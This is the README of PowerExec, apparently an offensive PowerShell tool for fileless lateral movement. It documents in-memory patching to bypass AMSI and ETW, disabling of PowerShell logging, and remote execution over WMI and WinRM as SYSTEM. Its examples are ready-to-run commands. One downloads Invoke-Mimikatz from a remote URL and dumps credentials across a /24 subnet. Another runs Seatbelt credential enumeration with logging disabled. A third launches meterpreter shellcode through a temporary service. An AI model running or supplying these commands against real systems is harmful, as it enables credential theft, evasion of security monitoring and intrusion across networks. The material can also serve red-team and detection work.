# PowerExec

PowerExec combines various bypass techniques and execution methods for fileless lateral movement.


## Functions

```
Invoke-PowerExec                -   runs PowerShell script block on remote computers through various execution methods
New-PowerLoader                 -   builds script block for in-memory execution of PowerShell, .NET assembly or shellcode
```


## Bypass techniques

Bypass techniques should be specified within the `New-PowerLoader` function:

| Bypass | Description                                              |
| ------ | -------------------------------------------------------- |
| AMSI   | Bypass Antimalware Scan Interface via in-memory patching |
| ETW    | Bypass Event Tracing for Windows via in-memory patching  |
| SBL    | Disable PowerShell Script Block Logging                  |
| PML    | Disable PowerShell Module Logging                        |


## Execution methods

The execution method should be specified within the `Invoke-PowerExec` function:

| Method          | Description                                                            |
| --------------- | ---------------------------------------------------------------------- |
| CimProcess      | Create process via WMI                                                 |
| CimTask         | Create temporary scheduled task via WMI running as NT AUTHORITY\SYSTEM |
| CimService      | Create temporary service via WMI running as NT AUTHORITY\SYSTEM        |
| CimSubscription | Create temporary WMI event subscription (experimental)                 |
| WinRM           | Run powershell via Windows Remote Management                           |

The transport protocol should be chosen between DCOM and WSMAN for WMI methods.


## Examples

Run a PowerShell script through WMI using a download cradle while bypassing AMSI and ETW :

```
PS C:\> $payload = New-PowerLoader -Type PoSh -FileUrl 'https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1' -ArgumentList 'Invoke-Mimikatz -DumpCreds' -Bypass AMSI,ETW
PS C:\> Invoke-PowerExec -ComputerList 192.168.1.0/24 -ScriptBlock $payload -Method CimProcess -Protocol Wsman -Threads 10
```

Run a .NET assembly through WinRM while bypassing AMSI, PowerShell Module Logging and Script Block Logging :

```
PS C:\> New-PowerLoader -Type NetAsm -FilePath .\Seatbelt.exe -ArgumentList 'CredEnum' -Bypass AMSI,PML,SBL | Invoke-PowerExec -ComputerList 192.168.1.1,192.168.1.2 -Method WinRM
```

Run a shellcode through a scheduled task :

```
PS C:\> New-PowerLoader -Type Shellcode -FilePath .\meterpreter.bin | Invoke-PowerExec -ComputerList 192.168.1.1 -Method CimService -Protocol Dcom
```


## Credits

  * https://rastamouse.me/blog/asb-bypass-pt3/
  * https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
  * https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/
  * https://blog.xpnsec.com/hiding-your-dotnet-etw
  * https://www.fireeye.com/blog/threat-research/2017/03/wmimplant_a_wmi_ba.html
  * https://www.mdsec.co.uk/2020/09/i-like-to-move-it-windows-lateral-movement-part-1-wmi-event-subscription/